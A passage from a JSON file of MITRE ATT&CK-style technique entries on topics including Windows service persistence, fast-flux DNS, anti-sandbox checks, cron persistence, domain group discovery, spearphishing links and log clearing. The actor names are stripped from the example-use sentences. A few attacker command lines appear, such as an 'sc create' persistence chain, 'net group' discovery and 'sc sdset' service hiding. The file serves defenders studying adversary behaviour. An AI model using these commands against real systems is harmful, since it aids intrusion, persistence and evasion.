      "can terminate a specific process by its process id.",
      "can install a new service.",
      "has the ability to gain system privileges through Windows services.",
      "has created a service when it is installed on the victim machine.",
      "contains a collection of Privesc-PowerUp modules that can discover and replace/modify service binaries paths and configs.",
      "establishes persistence by creating a service and naming it based off the operating system version running on the current machine.",
      "malware can create a new service sometimes naming it after the config information to gain persistence.",
      "creates a backdoor through which remote attackers can create a service.",
      "creates a Registry subkey that registers a new service.",
      "adds a new service named NetAdapter to establish persistence.",
      "can create a service at `HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SvcHost` to trigger execution and maintain persistence.",
      "creates new services to establish persistence.",
      "can be added as a service to establish persistence.  also has a module to change service configurations as well as start control and delete services.",
      "backdoor RoyalDNS established persistence through adding a service called Nwsapagent.",
      "can automatically launch a Linux virtual machine as a service at startup if the AutoStart option is enabled in the VBoxVmService configuration file.",
      "has created new services and modified existing services for persistence.",
      "dispatcher can establish persistence by registering a new service.",
      "can install itself as a new service.",
      "has registered itself as a system service in the Registry for automatic execution at system startup.",
      "has created a service named `Service1` for persistence.",
      "During the   used an arbitrary system service to load at system boot for persistence for . They also replaced the ImagePath registry value of a Windows service with a new backdoor binary.",
      "installs itself as a service for persistence.",
      "has attempted to install itself as a service to maintain persistence.",
      "has the ability to install itself as a service.",
      "can install as a Windows service for persistence.",
      "The  dropper creates and starts a Windows service named wsmprovav with the description Windows Check AV.",
      "can establish persistence by creating a service.",
      "has registered itself as a service using its export function.",
      "can create a new service using the service parser function ProcessScCommand.",
      "can use services to establish persistence.",
      "can modify service configurations.",
      "can register a Windows service named CsPower as part of its execution chain and a Windows service named clr_optimization_v2.0.51527_X86 to achieve persistence.",
      "modified Windows Services to ensure PowerShell scripts were loaded on the system.  also creates a Windows service to establish persistence.",
      "ran as a Windows service from the c:\\windows\\syswow64 folder.",
      "can create a service to establish persistence.",
      "creates a new Windows service with the malicious executable for persistence.",
      "has created new services and modified existing services for persistence.",
      "can create a new service to establish persistence.",
      "is capable of installing itself as a service.",
      "uses services.exe to register a new autostart service named Audit Service using a copy of the local lsass.exe file.",
      "During  threat actors installed DLLs and backdoors as Windows services.",
      "can create a new service to establish persistence.",
      "malware installs itself as a service to provide persistence and SYSTEM privileges.",
      "has registered a service typically named `WerFaultSvc` to decrypt and find a kernel driver and kernel driver loader to maintain persistence.",
      "has registered itself as a service to establish persistence.",
      "creates a new service to establish.",
      "has used sc.exe to create a new service for the VirtualBox driver.",
      "can create the services `httpsvc` and `w3esvc` for persistence .",
      "has a tool that creates a new service for persistence.",
      "created new Windows services and added them to the startup directories for persistence.",
      "Some  variants create a new Windows service to establish persistence.",
      "One variant of  creates a new service using either a hard-coded or randomly generated name.",
      "has created new services for persistence.",
      "has installed a Windows service to maintain persistence on victim machines.",
      "One persistence mechanism used by  is to register itself as a Windows service.",
      "can register itself as a system service to gain persistence.",
      "variants can add malicious DLL modules as new services. can also delete services from the victims machine.",
      "can load drivers by creating a new service using the `CreateServiceW` API.",
      "created a service using the command sc create SysUpdate binpath= cmd /c start [file path]&&sc config SysUpdate start= auto&&netstart SysUpdate for persistence.",
      "installs itself as a service to maintain persistence.",
      "has created new services to establish persistence.",
      "Some  samples install themselves as services for persistence by calling WinExec with the net start argument.",
      "If running as administrator  installs itself as a new service named bmwappushservice to establish persistence.",
      "Several  malware families install themselves as new services.",
      "is installed as a new service on the system.",
      "can establish persistence by registering a malicious DLL as an alternative Print Processor which is loaded when the print spooler service starts.",
      "has created system services to establish persistence for deployed tooling.",
      "registers itself as a service by adding several Registry keys.",
      "is capable of configuring itself as a service.",
      "can utilize built-in modules to modify service binaries and restore them to their original state.",
      "has been observed creating new services to maintain persistence.",
      "installs itself as a new service.",
      "has been installed as a Windows service.",
      "can create a service to establish persistence.",
      "can create a new service named msamger (Microsoft Security Accounts Manager).",
      "creates the service mssecsvc2.0 with the display name Microsoft Security Center (2.0) Service.",
      "created new Windows services for persistence that masqueraded as legitimate Windows services via name change.",
      "modified legitimate Windows services to install malware backdoors.  created the StorSyncSvc service to provide persistence for .",
      "used Windows Services with names such as `Windows Defend` for persistence of .",
      "has deployed  malware post-exploitation and registered it as a service for persistence.",
      "can persist as a Windows Service in operations.",
      "has configured tools such as  to run as Windows services.",
      "modified multiple services on victim machines to enable encryption operations.  has installed tools such as AnyDesk as a service on victim machines.",
      "can install system services for persistence.",
      "has used a compromised Domain Controller to create a service on a remote host.",
      "creates a new service for persistence."
    ],
    "description": "Adversaries may create or modify Windows services to repeatedly execute malicious payloads as part of persistence. When Windows boots up, it starts programs or applications called services that perform background system functions.(Citation: TechNet Services) Windows service configuration information, including the file path to the service's executable or recovery programs/commands, is stored in the Windows Registry.Adversaries may install a new service or modify an existing service to execute at startup in order to persist on a system. Service configurations can be set or modified using system utilities (such as sc.exe), by directly modifying the Registry, or by interacting directly with the Windows API. Adversaries may also use services to install and execute malicious drivers. For example, after dropping a driver file (ex: `.sys`) to disk, the payload can be loaded and registered via [Native API](https://attack.mitre.org/techniques/T1106) functions such as `CreateServiceW()` (or manually via functions such as `ZwLoadDriver()` and `ZwSetValueKey()`), by creating the required service Registry values (i.e. [Modify Registry](https://attack.mitre.org/techniques/T1112)), or by using command-line utilities such as `PnPUtil.exe`.(Citation: Symantec W.32 Stuxnet Dossier)(Citation: Crowdstrike DriveSlayer February 2022)(Citation: Unit42 AcidBox June 2020) Adversaries may leverage these drivers as [Rootkit](https://attack.mitre.org/techniques/T1014)s to hide the presence of malicious activity on a system. Adversaries may also load a signed yet vulnerable driver onto a compromised machine (known as \"Bring Your Own Vulnerable Driver\" (BYOVD)) as part of [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068).(Citation: ESET InvisiMole June 2020)(Citation: Unit42 AcidBox June 2020)Services may be created with administrator privileges but are executed under SYSTEM privileges, so an adversary may also use a service to escalate privileges. Adversaries may also directly start services through [Service Execution](https://attack.mitre.org/techniques/T1569/002).To make detection analysis more challenging, malicious services may also incorporate [Masquerade Task or Service](https://attack.mitre.org/techniques/T1036/004) (ex: using a service and/or payload name related to a legitimate OS or benign software component). Adversaries may also create hidden services (i.e., [Hide Artifacts](https://attack.mitre.org/techniques/T1564)), for example by using the `sc sdset` command to set service permissions via the Service Descriptor Definition Language (SDDL). This may hide a Windows service from the view of standard service enumeration methods such as `Get-Service`, `sc query`, and `services.exe`.(Citation: SANS 1)(Citation: SANS 2)",
    "similar_words": [
      "Windows Service"
    ],
    "id": "T1543.003"
  },
  "attack-pattern--29ba5a15-3b7b-4732-b817-65ea8f6468e6": {
    "name": "Fast Flux DNS",
    "example_uses": [
      "has used fast flux DNS for its C2.",
      "has used dynamic DNS service providers to host malicious domains.",
      "has used fast flux to mask botnets by distributing payloads across multiple IPs.",
      "operators have used dynamic DNS to mask the true location of their C2 behind rapidly changing IP addresses.",
      "has used a fast flux DNS for C2 IP resolution.",
      "has used fast flux DNS to mask their command and control channel behind rotating IP addresses."
    ],
    "description": "Adversaries may use Fast Flux DNS to hide a command and control channel behind an array of rapidly changing IP addresses linked to a single domain resolution. This technique uses a fully qualified domain name, with multiple IP addresses assigned to it which are swapped with high frequency, using a combination of round robin IP addressing and short Time-To-Live (TTL) for a DNS resource record.(Citation: MehtaFastFluxPt1)(Citation: MehtaFastFluxPt2)(Citation: Fast Flux - Welivesecurity)The simplest, \"single-flux\" method, involves registering and de-registering an addresses as part of the DNS A (address) record list for a single DNS name. These registrations have a five-minute average lifespan, resulting in a constant shuffle of IP address resolution.(Citation: Fast Flux - Welivesecurity)In contrast, the \"double-flux\" method registers and de-registers an address as part of the DNS Name Server record list for the DNS zone, providing additional resilience for the connection. With double-flux additional hosts can act as a proxy to the C2 host, further insulating the true source of the C2 channel.",
    "similar_words": [
      "Fast Flux DNS"
    ],
    "id": "T1568.001"
  },
  "attack-pattern--29be378d-262d-4e99-b00d-852d573628e6": {
    "name": "System Checks",
    "example_uses": [
      "can check the compromised host for the presence of multiple executables associated with analysis tools and halt execution if any are found.",
      "ran multiple system checks looking for processor and register characteristics to evade emulation and analysis.",
      "can check for the presence of the Registry key HKEY_CLASSES_ROOT\\\\Applications\\\\VMwareHostOpen.exe before proceeding to its main functionality.",
      "loader can check the amount of physical memory and terminates itself if the host has less than 1.5 Gigabytes of physical memory in total.",
      "can check for artifacts of VirtualBox Virtual PC and VMware environment and terminate itself if they are detected.",
      "has used a component called TerraLoader to check certain hardware and file information to detect sandboxed environments.",
      "can detect sandbox analysis environments by inspecting the process list and Registry.",
      "During   used tools that conducted a variety of system checks to detect sandboxes or VMware services.",
      "can detect whether it is executed in some virtualized or emulated environment by searching for specific artifacts such as communication with I/O ports and using VM-specific instructions.",
      "has the ability to search for designated file paths and Registry keys that indicate a virtualized environment from multiple products.",
      "obtains the hardware device list and checks if the MD5 of the vendor ID is equal to a predefined list in order to check for sandbox/virtualized environments.",
      "can check for Windows product ID's used by sandboxes and usernames and disk serial numbers associated with analyst environments.",
      "checks its directory location in an attempt to avoid launching in a sandbox.",
      "has checked the number of CPUs in the system to avoid being run in a sandbox or emulator.",
      "checks a number of system parameters to see if it is being run on real hardware or in a virtual machine environment such as `sysctl hw.model` and the kernel boot time.",
      "can parse the output of the native `system_profiler` tool to determine if the machine is running with 4 cores.",
      "scans processes to perform anti-VM checks.",
      "has the ability to perform anti-VM and anti-sandbox checks using string hashing the API call EnumWindows and checking for Qemu guest agent.",
      "dropper has checked the number of processes and the length and strings of its own file name to identify if the malware is in a sandbox environment.",
      "has some basic anti-sandbox detection that tries to detect Virtual PC Sandboxie and VMware.",
      "can check for specific usernames computer names device drivers DLL's and virtual devices associated with sandboxed environments and can enter an infinite loop and stop itself if any are detected.",
      "has run system checks to determine if they were operating in a virtualized environment.",
      "uses WMI to check the BIOS and manufacturer information for strings like VMWare Virtual and XEN and another WMI request to get the current temperature of the hardware to determine if it's a virtual machine environment.",
      "attempts to detect if it is being run in a Virtual Machine (VM) using a WMI query for disk drive name BIOS and motherboard information.",
      "checked the size of the hard drive to determine if it was being run in a sandbox environment. In the event of sandbox detection it would delete itself by overwriting the malware scripts with the contents of License.txt and exiting.",
      "checked if UCOMIEnumConnections and IActiveScriptParseProcedure32 Registry keys were detected as part of its anti-analysis technique.",
      "performs several anti-VM and sandbox checks on the victim's machine. One technique the group has used was to perform a WMI query SELECT * FROM MSAcpi_ThermalZoneTemperature to check the temperature to see if its running in a virtual environment.",
      "can search a compromised system's running processes and services to detect Hyper-V QEMU Virtual PC Virtual Box and VMware as well as Sandboxie.",
      "checks for virtualization software such as VMWare VirtualBox or QEmu on the compromised machine.",
      "can stop its execution when it recognizes the presence of certain monitoring tools.",
      "can identify strings such as Virtual vmware or VirtualBox to detect virtualized environments.",
      "has run several virtual machine and sandbox checks including checking if `Sbiedll.dll` is present in a list of loaded modules comparing the machine name to `HAL9TH` and the user name to `JohnDoe` and checking the BIOS version for known virtual machine identifiers.",
      "malware has used a series of checks to determine if it's being analyzed; checks include the length of executable names if a filename ends with .Md5.exe and if the program is executed from the root of the C:\\ drive as well as checks for sandbox-related libraries.",
      "checks if VMware tools is running in the background by searching for any process named vmtoolsd.",
      "can stop execution if the screen width of the targeted machine is not over 600 pixels.",
      "has a module that checks a number of indicators on the system to determine if its running on a virtual machine.",
      "can check the compromised host for processes associated with VMware or VirtualBox environments.",
      "can detect VMWare via its I/O port and Virtual PC via the vpcext instruction.",
      "can check for VMware-related files and DLLs related to sandboxes.",
      "searches for Sandboxie and VMware on the system.",
      "can check system flags and libraries process timing and API's to detect code emulation or sandboxing.",
      "During  the threat actors used a script that ran WMI queries to check if a VM or sandbox was running including VMWare and Virtualbox. The script would also call WMI to determine the number of cores allocated to the system; if less than two the script would stop execution.",
      "uses WMI to check BIOS version for VBOX bochs qemu virtualbox and vm to check for evidence that the script might be executing within an analysis environment.",
      "can halt execution if it identifies processes belonging to virtual machine software or analysis tools.",
      "has checked if Vmware or VirtualBox VM is running on a compromised host.",
      "can detect commonly used and generic virtualization platforms based primarily on drivers and file paths.",
      "can check to see if the infected machine has VM tools running.",
      "can run checks to verify if it is running within a virtualized environments including Hyper-V VirtualBox or VMWare and will terminate execution if the computer name is JOHN-PC.",
      "has the ability to determine if its runtime environment is virtualized.",
      "can run anti-sandbox checks using the Microsoft Excel 4.0 function GET.WORKSPACE to determine the OS version if there is a mouse present and if the host is capable of playing sounds.",
      "checked the domain name of the compromised host to verify it was running in a real environment.",
      "has the ability to detect Windows Sandbox VMWare or VirtualBox by querying `Win32_ComputerSystem` to extract the `Manufacturer` string.",
      "will check if it is being run in a virtualized environment by comparing the collected MAC address to c8:27:cc:c2:37:5a.",
      "can search loaded modules PEB structure file paths Registry keys and memory to determine if it is being debugged or running in a virtual environment.",
      "queries system resources on an infected machine to identify if it is executing in a sandbox or virtualized environment.",
      "has used macros to verify if a mouse is connected to a compromised machine.",
      "embeds code from the public `al-khaser` project a repository that works to detect virtual machines sandboxes and malware analysis environments.",
      "performs a variety of system environment checks to determine if it is running in a virtualized or sandboxed environment such as querying CPU temperature information and network card MAC address information.",
      "can determine if it is running in a virtualized environment by checking the OS version checking the number of running processes ensuring a 64-bit application is running on a 64-bit host and checking if the host has a valid MAC address.",
      "performs a variety of system checks to determine if it is running in an analysis environment or sandbox such as checking the number of processors (must be greater than two) and the amount of RAM (must be greater than 2GB).",
      "decryption relies on the infected machine's `HKLM\\SOFTWARE\\Microsoft\\Cryptography\\MachineGUID` value.",
      "has queried system resources on the victim device to identify if it is executing in a sandbox or virtualized environments checking usernames conducting WMI queries for system details checking for files commonly found in virtualized environments searching system services and inspecting process names.  has checked system GPU configurations for sandbox detection.",
      "performs timing checks using the Read-Time Stamp Counter (RDTSC) instruction on the victim CPU.",
      "performs various checks to determine if it is running in a sandboxed environment to prevent analysis.",
      "checks for files related to known sandboxes."
    ],
    "description": "Adversaries may employ various system checks to detect and avoid virtualization and analysis environments. This may include changing behaviors based on the results of checks for the presence of artifacts indicative of a virtual machine environment (VME) or sandbox. If the adversary detects a VME, they may alter their malware to disengage from the victim or conceal the core functions of the implant. They may also search for VME artifacts before dropping secondary or additional payloads. Adversaries may use the information learned from [Virtualization/Sandbox Evasion](https://attack.mitre.org/techniques/T1497) during automated discovery to shape follow-on behaviors.(Citation: Deloitte Environment Awareness)Specific checks will vary based on the target and/or adversary, but may involve behaviors such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047), [PowerShell](https://attack.mitre.org/techniques/T1059/001), [System Information Discovery](https://attack.mitre.org/techniques/T1082), and [Query Registry](https://attack.mitre.org/techniques/T1012) to obtain system information and search for VME artifacts. Adversaries may search for VME artifacts in memory, processes, file system, hardware, and/or the Registry. Adversaries may use scripting to automate these checks  into one script and then have the program exit if it determines the system to be a virtual environment. Checks could include generic system properties such as host/domain name and samples of network traffic. Adversaries may also check the network adapters addresses, CPU core count, and available memory/drive size. Once executed, malware may also use [File and Directory Discovery](https://attack.mitre.org/techniques/T1083) to check if it was saved in a folder or file with unexpected or even analysis-related naming artifacts such as `malware`, `sample`, or `hash`.Other common checks may enumerate services running that are unique to these applications, installed programs on the system, manufacturer/product fields for strings relating to virtual machine applications, and VME-specific hardware/processor instructions.(Citation: McAfee Virtual Jan 2017) In applications like VMWare, adversaries can also use a special I/O port to send commands and receive output.  Hardware checks, such as the presence of the fan, temperature, and audio devices, could also be used to gather evidence that can be indicative a virtual environment. Adversaries may also query for specific readings from these devices.(Citation: Unit 42 OilRig Sept 2018)",
    "similar_words": [
      "System Checks"
    ],
    "id": "T1497.001"
  },
  "attack-pattern--2acf44aa-542f-4366-b4eb-55ef5747759c": {
    "name": "Cron",
    "example_uses": [
      "uses cron tasks to ensure persistence.",
      "can install itself as a cron job.",
      "used a cron job for persistence on Mac devices.",
      "has installed itself via crontab.",
      "installed a cron job that downloaded and executed files from the C2.",
      "can create a cronjob for persistence if it determines it is on a Linux system.",
      "can use crontabs to establish persistence.",
      "The  Linux variant has used a crontab entry with a @reboot line to gain persistence.",
      "can use Cron to create periodic and pre-scheduled background jobs.",
      "has made modifications to the crontab file including in `/var/cron/tabs/`.",
      "has used crontab to download and run shell scripts every minute to ensure persistence.",
      "has used cron to create pre-scheduled and periodic background jobs on a Linux system.",
      "uses crontab for persistence if it does not have root privileges.",
      "uses a Cron job to establish persistence when infecting Linux hosts.",
      "will configure a crontab for process execution to start the backdoor on reboot if it is not initially running under group 0 privileges.",
      "During  threat actors configured cron jobs to retrieve payloads from actor-controlled infrastructure."
    ],
    "description": "Adversaries may abuse the cron utility to perform task scheduling for initial or recurring execution of malicious code.(Citation: 20 macOS Common Tools and Techniques) The cron utility is a time-based job scheduler for Unix-like operating systems.  The  crontab file contains the schedule of cron entries to be run and the specified times for execution. Any crontab files are stored in operating system-specific file paths.An adversary may use cron in Linux or Unix environments to execute programs at system startup or on a scheduled basis for [Persistence](https://attack.mitre.org/tactics/TA0003). In ESXi environments, cron jobs must be created directly via the crontab file (e.g., `/var/spool/cron/crontabs/root`).(Citation: CloudSEK ESXiArgs 2023)",
    "similar_words": [
      "Cron"
    ],
    "id": "T1053.003"
  },
  "attack-pattern--2aed01ad-3df3-4410-a8cb-11ea4ded587c": {
    "name": "Domain Groups",
    "example_uses": [
      "collects a list of domain groups with the command net localgroup /domain.",
      "has used the AD Explorer tool to enumerate groups on a victim's network.",
      "Commands such as net group /domain can be used in  to gather information about and manipulate groups.",
      "can collect information about domain groups and members.",
      "can use `System.DirectoryServices` namespace to retrieve domain group information.",
      "During the   used  to enumerate domain groups.",
      "has executed `net group domain admins /dom` for discovery on compromised machines.",
      "has used a reconnaissance module that can be used to retrieve Windows domain membership information.",
      "has run `net group` in compromised environments to discover domain groups.",
      "has used net group /domain net group domain admins /domain and net group Exchange Trusted Subsystem /domain to find domain group permission settings.",
      "can enumerate domain groups.",
      "can identify targets by querying account groups on a domain contoller.",
      "has used the command `net group domain admins /domain` to enumerate domain groups.",
      "may collect domain group information by running net group /domain or a series of other commands on a victim.",
      "During  the threat actors use the command `net group domain admins /dom` to enumerate domain groups.",
      "can determine if a user on a compromised host has domain admin privileges.",
      "can use `net group` for discovery on targeted domains.",
      "can enumerate domain groups by executing net.exe group /domain.",
      "specifically looks for Domain Admins and power users within the domain.",
      "can identify domain group membership for the current user.",
      "can conduct Active Directory reconnaissance using tools such as Sharphound or .",
      "can use `net.exe group domain admins /domain` to identify Domain Administrators.",
      "performs discovery of permission groups net group /domain.",
      "has used net group Domain Admins /domain to identify domain administrators.",
      "has used specific malware modules to gather domain membership.",
      "has used batch scripts to enumerate administrators and users in the domain.",
      "has checked for the domain admin group and Exchange Trusted Subsystem groups using the commands net group Exchange Trusted Subsystem /domain and net group domain admins /domain.",
      "can gather the user accounts within domain groups.",
      "can identify the domain membership of a compromised host.",
      "can be used to gather information on permission groups within a domain.",
      "can determine if a targeted system is part of an Active Directory domain by expanding the %USERDNSDOMAIN% environment variable.",
      "has enumerated domain groups on targeted hosts.",
      "can identify domain groups through `cmd.exe /c net group Domain Admins /domain`."
    ],
    "description": "Adversaries may attempt to find domain-level groups and permission settings. The knowledge of domain-level permission groups can help adversaries determine which groups exist and which users belong to a particular group. Adversaries may use this information to determine which users have elevated permissions, such as domain administrators.Commands such as net group /domain of the [Net](https://attack.mitre.org/software/S0039) utility,  dscacheutil -q group on macOS, and ldapsearch on Linux can list domain-level groups.",
    "similar_words": [
      "Domain Groups"
    ],
    "id": "T1069.002"
  },
  "attack-pattern--2b5aa86b-a0df-4382-848d-30abea443327": {
    "name": "Vulnerabilities",
    "example_uses": [
      "In 2017  conducted technical research related to vulnerabilities associated with websites used by the Korean Sport and Olympic Committee a Korean power company and a Korean airport.",
      "has used publicly available exploit code for initial access.",
      "weaponized publicly-known vulnerabilities for initial access and other purposes during ."
    ],
    "description": "Adversaries may acquire information about vulnerabilities that can be used during targeting. A vulnerability is a weakness in computer hardware or software that can, potentially, be exploited by an adversary to cause unintended or unanticipated behavior to occur. Adversaries may find vulnerability information by searching open databases or gaining access to closed vulnerability databases.(Citation: National Vulnerability Database)An adversary may monitor vulnerability disclosures/databases to understand the state of existing, as well as newly discovered, vulnerabilities. There is usually a delay between when a vulnerability is discovered and when it is made public. An adversary may target the systems of those known to conduct vulnerability research (including commercial vendors). Knowledge of a vulnerability may cause an adversary to search for an existing exploit (i.e. [Exploits](https://attack.mitre.org/techniques/T1588/005)) or to attempt to develop one themselves (i.e. [Exploits](https://attack.mitre.org/techniques/T1587/004)).",
    "similar_words": [
      "Vulnerabilities"
    ],
    "id": "T1588.006"
  },
  "attack-pattern--2b742742-28c3-4e1b-bab7-8350d6300fa7": {
    "name": "Spearphishing Link",
    "example_uses": [
      "has used spearphishing e-mails with links to cloud services to deliver malware.",
      "has been distributed via e-mails containing a malicious link.",
      "has sent targeted spearphishing e-mails with malicious links.",
      "has sent spearphishing emails containing a malicious Dropbox download link.",
      "has sent malicious links to victims through email campaigns.",
      "delivered spearphishing emails with malicious links included.",
      "has sent spearphishing emails containing a link to a document that contained malicious macros or took the victim to an actor-controlled domain.",
      "has sent e-mails with malicious links often crafted for specific targets.",
      "has been spread in phishing campaigns using malicious web links.",
      "has been distributed through malicious links contained within spearphishing emails.",
      "During  threat actors sent spearphishing emails containing links to compromised websites where malware was downloaded.",
      "has been distributed as a malicious link within an email.",
      "has delivered zero-day exploits and malware to victims via targeted emails containing a link to malicious content hosted on an uncommon Web server.",
      "has been delivered via malicious links embedded in e-mails.",
      "is distributed in phishing emails containing links to distribute malicious VBS or MSI files.  uses applications such as Microsoft Teams for distributing links to payloads.",
      "has been distributed through phishing emails containing a malicious URL.",
      "has sent phishing emails that contain a link to an external server with ZIP and RAR archives.",
      "has been distributed via spearphishing link.",
      "has conducted broad phishing campaigns using malicious links.",
      "has been delivered by phishing emails containing links.",
      "During  the threat actors sent phishing emails to victims that contained a malicious link.",
      "has sent victims emails containing links to compromised websites.",
      "has crafted phishing emails containing malicious hyperlinks.",
      "has embedded links to malicious downloads in e-mails.",
      "has sent spearphishing emails containing a link to a zip file hosted on Google Drive.",
      "has been spread via malicious links embedded in emails.",
      "has been distributed via emails containing a malicious link that appears to be a PDF document.",
      "has delivered malicious links to their intended targets.",
      "has distributed targeted emails containing links to malicious documents with embedded macros.",
      "has sent spearphishing emails containing malicious links.",
      "has been delivered via spearphishing emails which contained malicious links.",
      "has sent spearphishing emails containing malicious links.",
      "has sent spearphishing emails containing hyperlinks to malicious files.",
      "has sent malicious links to victims via email.",
      "has sent spearphishing emails with links often using a fraudulent lookalike domain and stolen branding.",
      "has been distributed through malicious links contained within spearphishing emails.",
      "has sent spearphishing emails containing links to .hta files.",
      "has used malicious links in e-mails to deliver malware.",
      "has relied on victims to open malicious links in e-mails for execution.",
      "can send consent phishing emails containing malicious links designed to steal users access tokens.",
      "has been spread through e-mail campaigns with malicious links.",
      "During   sent emails containing a malicious link to student targets in India.",
      "has been delivered via malicious links in phishing e-mails.",
      "has sent phishing emails with malicious links included.",
      "has sent malicious URL links through email to victims. In some cases the URLs were shortened or linked to Word documents with malicious macros that executed PowerShells scripts to download .",
      "has been spread via emails containing malicious links.",
      "has sent spearphising emails with malicious links to potential victims.",
      "has sent spearphishing emails with links to harvest credentials and deliver malware.",
      "has sent emails with URLs pointing to malicious documents.",
      "has been spread via e-mail campaigns utilizing malicious links.",
      "has used spearphishing with a link to trick victims into clicking on a link to a zip file containing malicious files.",
      "has used spearphishing emails (often sent from compromised accounts) containing malicious links.",
      "During  the threat actors sent phishing emails with unique malicious links likely for tracking victim clicks.",
      "has been delivered to victims through e-mail links to malicious files.",
      "has spread through emails with malicious links.",
      "has used spearphishing e-mails with malicious links to deliver malware.",
      "has been delivered via phishing emails which contained malicious links.",
      "sent spearphishing emails which used a URL-shortener service to masquerade as a legitimate service and to redirect targets to credential harvesting sites.",
      "has been spread via emails with embedded malicious links.",
      "has sent spearphishing emails to potential targets that contained a malicious link.",
      "has sent spearphishing emails containing malicious links.",
      "attempted to trick targets into clicking on a link featuring a seemingly legitimate domain from Adobe.com to download their malware and gain initial access.",
      "has sent phishing emails containing a link to an actor-controlled Google Drive document or other free online file hosting services.",
      "has used spearphishing with links to deliver files with exploits to initial victims.",
      "has sent spearphishing emails containing malicious links.",
      "has used spam emails that contain a link that redirects the victim to download a malicious document.",
      "has been spread through malicious links embedded in e-mails.",
      "During  the threat actors sent spearphishing emails containing a malicious link.",
      "has been spread via malicious links embedded in e-mails.",
      "has been delivered via malicious links in e-mail.",
      "leveraged spearphishing emails with malicious links to initially compromise victims.",
      "During   sent malicious OneDrive links with fictitious job offer advertisements via email.",
      "has used phishing emails with malicious links to gain initial access.",
      "has been distributed to victims through emails containing malicious links.",
      "has sent emails containing links to malicious JavaScript files.",
      "utilized emails with hyperlinks leading to malicious ZIP archive files containing scripts to download and install .",
      "distributed malicious links in phishing emails leading to HTML files that would direct the victim to malicious MSC files if running Windows based on User Agent fingerprinting during .",
      "has distributed malicious links to victims that redirect to EvilProxy-based phishing sites to harvest credentials.",
      "has been delivered through phishing emails containing malicious links."
    ],
    "description": "Adversaries may send spearphishing emails with a malicious link in an attempt to gain access to victim systems. Spearphishing with a link is a specific variant of spearphishing. It is different from other forms of spearphishing in that it employs the use of links to download malware contained in email, instead of attaching malicious files to the email itself, to avoid defenses that may inspect email attachments. Spearphishing may also involve social engineering techniques, such as posing as a trusted source.All forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this case, the malicious emails contain links. Generally, the links will be accompanied by social engineering text and require the user to actively click or copy and paste a URL into a browser, leveraging [User Execution](https://attack.mitre.org/techniques/T1204). The visited website may compromise the web browser using an exploit, or the user will be prompted to download applications, documents, zip files, or even executables depending on the pretext for the email in the first place.Adversaries may also include links that are intended to interact directly with an email reader, including embedded images intended to exploit the end system directly. Additionally, adversaries may use seemingly benign links that abuse special characters to mimic legitimate websites (known as an \"IDN homograph attack\").(Citation: CISA IDN ST05-016) URLs may also be obfuscated by taking advantage of quirks in the URL schema, such as the acceptance of integer- or hexadecimal-based hostname formats and the automatic discarding of text before an @ symbol: for example, `hxxp://google.com@1157586937`.(Citation: Mandiant URL Obfuscation 2023)Adversaries may also utilize links to perform consent phishing, typically with OAuth 2.0 request URLs that when accepted by the user provide permissions/access for malicious applications, allowing adversaries to  [Steal Application Access Token](https://attack.mitre.org/techniques/T1528)s.(Citation: Trend Micro Pawn Storm OAuth 2017) These stolen access tokens allow the adversary to perform various actions on behalf of the user via API calls. (Citation: Microsoft OAuth 2.0 Consent Phishing 2021)Adversaries may also utilize spearphishing links to [Steal Application Access Token](https://attack.mitre.org/techniques/T1528)s that grant immediate access to the victim environment. For example, a user may be lured through consent phishing into granting adversaries permissions/access via a malicious OAuth 2.0 request URL .(Citation: Trend Micro Pawn Storm OAuth 2017)(Citation: Microsoft OAuth 2.0 Consent Phishing 2021)Similarly, malicious links may also target device-based authorization, such as OAuth 2.0 device authorization grant flow which is typically used to authenticate devices without UIs/browsers. Known as device code phishing, an adversary may send a link that directs the victim to a malicious authorization page where the user is tricked into entering a code/credentials that produces a device token.(Citation: SecureWorks Device Code Phishing 2021)(Citation: Netskope Device Code Phishing 2021)(Citation: Optiv Device Code Phishing 2021)",
    "similar_words": [
      "Spearphishing Link"
    ],
    "id": "T1566.002"
  },
  "attack-pattern--2bce5b30-7014-4a5d-ade7-12913fe6ac36": {
    "name": "Clear Linux or Mac System Logs",
    "example_uses": [
      "can clear possible malware traces such as application logs.",
      "has removed system logs from /var/log/syslog.",
      "has cleared log files within the /var/log/ folder.",
      "removes logs from /var/logs and /Library/logs.",
      "clears error logs after reading embedded commands for execution.",
      "can clear logs on all devices used along its connection path to compromised network infrastructure.",
      "has overwritten Linux system logs and unsets the Bash history file (effectively removing logging) during intrusions.",
      "has cleared logs including .bash_history auth.log lastlog wtmp and btmp."
    ],
    "description": "Adversaries may clear system logs to hide evidence of an intrusion. macOS and Linux both keep track of system or user-initiated actions via system logs. The majority of native system logging is stored under the /var/log/ directory. Subfolders in this directory categorize logs by their related functions, such as:(Citation: Linux Logs)* /var/log/messages:: General and system-related messages* /var/log/secure or /var/log/auth.log: Authentication logs* /var/log/utmp or /var/log/wtmp: Login records* /var/log/kern.log: Kernel logs* /var/log/cron.log: Crond logs* /var/log/maillog: Mail server logs* /var/log/httpd/: Web server access and error logs",
    "similar_words": [
      "Clear Linux or Mac System Logs"
    ],
    "id": "T1070.002"
  },
  "attack-pattern--2bee5ffb-7a7a-4119-b1f2-158151b19ac0": {
    "name": "Application or System Exploitation",
    "example_uses": [
      "uses a custom DoS tool that leverages CVE-2015-5374 and targets hardcoded IP addresses of Siemens SIPROTEC devices."
    ],
    "description": "Adversaries may exploit software vulnerabilities that can cause an application or system to crash and deny availability to users. (Citation: Sucuri BIND9 August 2015) Some systems may automatically restart critical applications and services when crashes occur, but they can likely be re-exploited to cause a persistent denial of service (DoS) condition.Adversaries may exploit known or zero-day vulnerabilities to crash applications and/or systems, which may also lead to dependent applications and/or systems to be in a DoS condition. Crashed or restarted applications or systems may also have other effects such as [Data Destruction](https://attack.mitre.org/techniques/T1485), [Firmware Corruption](https://attack.mitre.org/techniques/T1495), [Service Stop](https://attack.mitre.org/techniques/T1489) etc. which may further cause a DoS condition and deny availability to critical information, applications and/or systems. ",
    "similar_words": [
      "Application or System Exploitation"
    ],
    "id": "T1499.004"
  },
  "attack-pattern--2cd950a6-16c4-404a-aa01-044322395107": {
    "name": "InstallUtil",
    "example_uses": [
      "has used Installutill to download content.",
      "has used InstallUtil.exe to execute a malicious Beacon stager.",
      "has used `InstallUtil.exe` as part of its process to disable Windows Defender.",
      "has used InstallUtil.exe to execute malicious software.",
      "had used `InstallUtil.exe` to download and deploy executables.",
